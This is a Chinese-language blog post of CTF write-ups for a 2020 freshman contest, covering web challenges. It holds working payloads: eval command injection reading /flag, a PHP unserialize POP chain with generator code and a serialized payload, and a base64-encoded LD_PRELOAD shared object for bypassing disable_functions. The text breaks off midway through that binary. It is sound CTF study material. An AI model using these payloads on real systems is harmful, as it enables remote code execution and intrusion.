<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Yourname"><title>writeup for 2020 新生杯 · K1rit0's Blog</title><meta name="description" content="这次顶着桐老爷的id(kirito zbds, 本来只是想着做做Web和尝试做完Crypto的(结果没有做完,有趣的加密是真的有趣, 结果发现不做Misc分不太够, 就肝了几道, 还是学到了不少东西的.

所以先来个目录吧(pwn真的是一道都不会嗯…:
Web

假的签到
世界上最简单的后门
Let"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/favicon.webp"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li><li> <a href="/links">Links</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li></div><div class="avatar"><img src="/images/logo.webp"></div></div></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo@2x.webp" style="width:220px;" alt="favicon"><h3 title=""><a href="/">K1rit0's Blog</a></h3><div class="description"><p>A simple and beautiful blog</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/Lhcfl"><i class="fa fa-github"></i></a></li><li><a href="mailto:yourname@example.com"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://zhihu.com/people/jin-xin-4-68"><i class="fa fa-mortar-board"></i></a></li></ul></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> Yourname</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><span>Anatolo </span></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>writeup for 2020 新生杯</a></h3></div><div class="post-content"><p><blockquote>
<p>这次顶着桐老爷的id(kirito zbds, 本来只是想着做做Web和尝试做完Crypto的(结果没有做完,有趣的加密<del>是真的有趣</del>, 结果发现不做Misc分不太够, 就肝了几道, 还是学到了不少东西的.</p>
</blockquote>
<p>所以先来个目录吧(pwn真的是一道都不会嗯…:</p>
<p>Web</p>
<ul>
<li><a href='#1'>假的签到</a></li>
<li><a href='#2'>世界上最简单的后门</a></li>
<li><a href='#3'>Let’s play a simple game again</a></li>
<li><a href='#4'>lottery_revenge</a></li>
<li><a href='#5'>unserialize</a></li>
<li><a href='#6'>又一个后门</a></li>
<li><a href='#7'>babysql</a></li>
<li><a href='#8'>babyssrf</a></li>
</ul>
<p>OSINT</p>
<ul>
<li><a href='#9'>checkin</a></li>
</ul>
<p>REVERSE</p>
<ul>
<li><a href='#10'>捉迷藏</a></li>
<li><a href='#11'>basic_hash</a></li>
<li><a href='#12'>ByteCode</a></li>
</ul>
<p>Misc</p>
<ul>
<li><a href='#13'>真·签到</a></li>
<li><a href='#14'>Look_at_your_keyboard</a></li>
<li><a href='#15'>Buddha</a></li>
<li><a href='#16'>Do you know Xp0int</a></li>
<li><a href='#17'>close_base</a></li>
<li><a href='#18'>PMGBA</a></li>
<li><a href='#19'>集齐五龙珠</a></li>
</ul>
<p>Cyrpto</p>
<ul>
<li><a href='#20'>碰碰车</a></li>
<li><a href='#21'>EasyRSA</a></li>
<li><a href='#22'>Go Home</a></li>
<li><a href='#23'>block cipher</a></li>
<li><a href='#24'>ant forest</a><br><a name='1'></a></li>
</ul>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="假的签到"><a href="#假的签到" class="headerlink" title="假的签到"></a>假的签到</h2><p>robots! robots! robots! robots协议<br>这个协议里面是用来设定一些网站里不能被搜索引擎获取的内容的(不过CTF里就变成提示做题人方向的一个文件了?<br>一般拿到web说不定robots.txt里面就有提示呢<del>不过大概率是没有的</del></p>
<p>所以马上进/robots.txt看看, 里面有个提示:/phpp_tql.php<br>访问/phpp_tql.php有一段源码<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-c3a1121734864c0d88c7d4bbb4e511db.png" alt="图片.png"><br>看了下是关于md5的比较的,因为是===, 肯定不会是弱类型了, 想起之前就挖过一个坑<a target="_blank" rel="noopener" href="http://47.98.130.190:8090/archives/web-md5sha%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83">某篇MD5的总结</a>, 所以很快就想到用数组来做了.</p>
<p><strong>当a和b都是数组的时候, md5(a) === md5(b) 会判断为真.</strong><br>利用这个就可以构造payload: <code>?phpp[]=1&amp;hphh[]=2</code><br><a name='2'></a></p>
<h2 id="世界上最简单的后门"><a href="#世界上最简单的后门" class="headerlink" title="世界上最简单的后门"></a>世界上最简单的后门</h2><p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-7523c61da6594c3daaef38a5131d36b4.png" alt="图片.png"><br>啊这, eval()真的很安全的.<br>关于直接把用户的输入直接放在eval()中导致目录都被翻了个遍这档事(<br>也没想太多, 手动翻了一下目录(dalao都是直接搜索flag的<br>往上翻一个目录<code>system(&#39;ls /&#39;);</code>就发现有flag了<br>于是掏出hackbar(POST) <code>c=system(&#39;cat /flag&#39;);</code><br><a name='3'></a></p>
<h2 id="Let’s-play-a-simple-game-again"><a href="#Let’s-play-a-simple-game-again" class="headerlink" title="Let’s play a simple game again"></a>Let’s play a simple game again</h2><p>开头根据要求GET和POST传参就行了.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-bbf65015412b431eab2aa9e23f8723cd.png" alt="图片.png"><br>但是这里好像出了一个小问题. 做题的时候都是想着怎么做快就怎么做. 于是给主办方提交wp的时候似乎遗漏了什么(不要打我我真的是后来才发现的…</p>
<p>不是admin就进不去吗! 其实第一想法应该就是X-Forwarded-For改127.0.0.1的, 然而我直接去看Cookies了, 也没有改XFF(X-Forwarded-For</p>
<p>发现<code>Cookies: YWRtaW49MA==</code>, 两个等号十有八九是base64了, 扔去base64解码出来的是<code>admin=0</code>, 想着让Cookies为<code>admin=1</code>应该没问题了. 所以将Cookies改成<code>YWRtaW49MQ==</code>, 就拿到<code>Welcome admin! Here is your flag:ctf&#123;Have_4_n1ce_c0mpetition!&#125;</code>了.</p>
<p>然而…事情并没有这么简单, 昨天某御坂大佬发了自己的wp之后我发现, 什么???X-Forwarded-For要改127.0.0.1???, 我没改怎么拿到flag了???<br>于是看了看自己的firefox插件…<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-6b3d3e511cf849dbb10063a1442afc3c.png" alt="图片.png"><br>屮…原来是之前做了题就没有关掉这个, 导致自己一直都是127.0.0.1…<br>所以直接就出flag了…<br>但是wp已经提交了啊! 也没办法改了, 说实话有点慌…<br><a name='4'></a></p>
<h2 id="lottery-revenge"><a href="#lottery-revenge" class="headerlink" title="lottery_revenge"></a>lottery_revenge</h2><p>去年也有抽奖, 一样的页面, 不一样的味道…(伪随机数的攻击居然在web里面出现了…</p>
<p>因为去年做过, 所以上来直接就开抽了(burpsuite永远的神, 但是发现不断访问data.php都是同一个响应, 有点不太对劲.<br>所以看了看响应发现了一段注释</p>
<p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-fc6b045f35f149dd8b50dc4528d28ff7.png" alt="图片.png"></p>
<p>啊…抽奖它, 它升级了.<br>要求<code>$_POST[&#39;admin_key&#39;]==$_SESSION[&#39;key&#39;]</code> </p>
<p>session就是时间戳吧. 第一个想法是先取现在的时间戳加上一个常数然后不停访问. 但是怎样都访问不成功(事实上就算访问成功了也就抽了一次奖, 下一次还得重新构造新的时间戳…</p>
<p>其实这里卡了一段时间(我也不知道自己到底爆破了多久…, 发现怎样都不行后就去看了下$_SESSION变量有没有什么可以利用的特性或者漏洞. 还真就发现了一个特性:<strong>当用户第一次访问的时候,$_SESSION的所有变量都是为空的(就是说初始化为空嘛</strong>, 可以看一下源码, 给<code>$_SESSION[&#39;key&#39;]</code>赋值是在一次访问之后, 所以!</p>
<p>只需要不带Cookies以及带上空的admin_key访问data.php就可以开始抽奖啦.<br>抽出结果还是很开心的, 但是结果还需要下一步…<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-f657ee08e09a4a97a063d9fd76f10eb5.png" alt="图片.png"></p>
<p>离谱, 按着提示进去<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-424af361456148ddaa656b953ec9c0e7.png" alt="图片.png"></p>
<p>一开始没懂这个页面要我干嘛, 看看注释有没有提示, 发现下面有个source=1<br>dddd, ?source=1看源码</p>
<p><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-2ec42f08584f42debb5b0bcbc585174d.png" alt="图片.png"></p>
<p>大概是说随机生成30个数, 对应一个表中的30个字母生成一个随机的字符串, 给出前11位猜整个字符串.</p>
<p>毕竟做了挺多伪随机数的题了, 看到<code>mt_rand()</code>就想起之前差点没把我整吐的MT-19937.(当种子设定每次随机出来的数都是一模一样是不是很神奇啊! N1CTF那道伪随机数还历历在目.</p>
<p>所以说, 理论上知道随机数前面的几位输出是可以逆推回种子的(有时候需要足够多的输出才能得到种子, 但具体逆的算法肯定不是这题的考点(<del>考了我也逆不出来, python脚本倒是有一个…</del></p>
<p>所以去搜了一下有没有攻击<code>mt_rand()</code>的脚本. 真就有一个php_mt_seed, github上就有了. 但是做的时候这里踩了一个大坑, github上面的是低版本的脚本, 所以导致跑了一下午都没有跑出结果来. </p>
<p>直到晚上发现别人的blog用的明显不是一个版本的脚本! 才去找了找发现真有从未体验过的船新版本, 马上扔进虚拟机跑, 不到一分钟就出结果了.<br><img src="http://47.98.130.190:8090/upload/2020/11/%E5%9B%BE%E7%89%87-d72e71e29d1a403991af5990f5eccc43.png" alt="图片.png"></p>
<p>拿着刚出来的种子生成字符串提交就行了<br><a name='5'></a></p>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><p>一直觉得反序列化真的很有意思, 就像推理一样一步一步的往下推出payload<br>源码在这</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getit</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getit(<span class="variable">$method</span>), <span class="variable">$args</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span>,<span class="variable">$arggg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evallll</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;evil,<span class="keyword">$this</span>-&gt;arggg);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;sssssss&#x27;</span>]);</span><br></pre></td></tr></table></figure>
<p>首先call_user_func()可以执行php中的函数, 包括<code>system(), assert()</code>这些危险的函数</p>
<p>而源码里面只有在类C中的call_user_func()是可以自己给定执行的函数和所用的参数的, 变量<code>$evil</code>和函数<code>evallll()</code>也提示了危险函数就出现在类C中, 所以现在的目的就是想办法调用类C中的<code>evallll()</code></p>
<p>反序列化的题基本离不开魔法函数, 找了一下, 这里的出现了<code>__destruct()</code>和<code>__call($method, $args)</code>.</p>
<p>对于<code>__destruct()</code>, 当某个对象被销毁的时候如果存在这个方法就会调用它. 程序结束肯定会销毁呀.</p>
<p>而对于<code>__call()</code>:<br><strong>当某个对象的一个不存在的方法被调用时, 如果__call方法存在, 则会调用__call方法, 第一个参数是所调用的那个不存在的方法名, 第二个参数是调用不存在的方法时的参数.</strong></p>
<p>因为A中的<code>__destruct()</code>会调用<code>$data-&gt;close()</code>, 所以能靠这个从A进入B的<code>__call</code>. </p>
<p>再看看B中的<code>call_user_func_array($this-&gt;getit($method), $args);</code><br>其实就是<code>call_user_func_array($this-&gt;cache[$key], $args);</code></p>
<p>做到这里我就卡住了, 因为<code>$args</code>并不可控, 所以一时半会想不到怎样通过B中的这个函数去进入C. 于是决定去看看<code>call_user_func_array();</code>的手册.</p>
<p>这才知道原来这个函数的第一个参数可以是一个数组,具体是这样:<code>[对象,对象的方法]</code>, 这样就可以调用C中的<code>evallll()</code>了!</p>
<p>所以只需要有:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class C中:</span><br><span class="line"><span class="variable">$evil</span> = <span class="string">&#x27;system()&#x27;</span>;</span><br><span class="line"><span class="variable">$arggg</span> = cmd; <span class="comment"># 具体就是需要执行的指令</span></span><br><span class="line"></span><br><span class="line">class B中:</span><br><span class="line"><span class="variable">$cache</span>[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> C,<span class="string">&#x27;evallll&#x27;</span>]</span><br><span class="line"></span><br><span class="line">class A中:</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> B</span><br></pre></td></tr></table></figure>
<p>这样就可以任意执行命令了. 至于构造payload, 利用php就能构造了.<br>附上构造的代码:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$ob</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = <span class="variable">$ob</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">make</span>(<span class="params"><span class="variable">$ob2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cache = <span class="variable">$ob2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getit</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cache[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array(<span class="keyword">$this</span>-&gt;getit(<span class="variable">$method</span>), <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$evil</span> = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arggg</span> = <span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evallll</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        call_user_func(<span class="keyword">$this</span>-&gt;evil, <span class="keyword">$this</span>-&gt;arggg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$b</span>-&gt;make([<span class="string">&#x27;close&#x27;</span> =&gt; [<span class="keyword">new</span> C, <span class="string">&#x27;evallll&#x27;</span>]]);</span><br><span class="line"><span class="variable">$a</span>-&gt;make(<span class="variable">$b</span>);</span><br><span class="line">var_dump(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
<p>得到的payload为: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sssssss&#x3D;O:1:&quot;A&quot;:1:&#123;s:4:&quot;data&quot;;O:1:&quot;B&quot;:1:&#123;s:5:&quot;cache&quot;;a:1:&#123;s:5:&quot;close&quot;;a:2:&#123;i:0;O:1:&quot;C&quot;:2:&#123;s:4:&quot;evil&quot;;s:6:&quot;system&quot;;s:5:&quot;arggg&quot;;s:9:&quot;cat &#x2F;flag&quot;;&#125;i:1;s:7:&quot;evallll&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><a name='6'></a></p>
<h2 id="又一个后门"><a href="#又一个后门" class="headerlink" title="又一个后门"></a>又一个后门</h2><p>这题做的时候发生了件小趣事(<del>当然不是指前二血的大佬在/tmp下面搞事情啦.也不是指上一个大佬做完了题连so文件都没有删啦.更不是指自己做完了还忘记把flag文件给清理掉.</del></p>
<p>看了下phpinfo(), 发现能执行命令的函数都被ban掉了.</p>
<p>利用scandir()函数搜索网站目录.发现有tmp文件夹, 尝试上传文件发现可行.</p>
<p>想了想是否存在绕过disable_functions的漏洞呢?翻了翻百度, 找到一个在Github上的利用LD_PRELOAD漏洞绕过disable_functions的项目.<a target="_blank" rel="noopener" href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">附上链接</a></p>
<p>具体原理<strong>是利用LD_PRELOAD的特点,它可以影响程序的运行时的链接，它允许在程序运行前优先加载用户定义的动态链接库, 这样就可以覆盖正常的函数库, 调用一些被ban的函数.</strong>(有理解的不对的大佬请务必告诉我!!!</p>
<p>所以根据github上面的README.MD一步一步的做就行了</p>
<h3 id="1-先上传一个bypass-disablefunc-x64-so"><a href="#1-先上传一个bypass-disablefunc-x64-so" class="headerlink" title="1. 先上传一个bypass_disablefunc_x64.so"></a>1. 先上传一个bypass_disablefunc_x64.so</h3><p>由于so文件是二进制文件, 所以上传的时候考虑先base64编码, 传上去用php自带的函数解码,下面是当时做题的payload(可能会有点长hhh</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=var_dump(scandir(<span class="string">&#x27;/var/tmp&#x27;</span>));<span class="variable">$a</span>=<span class="string">&#x27;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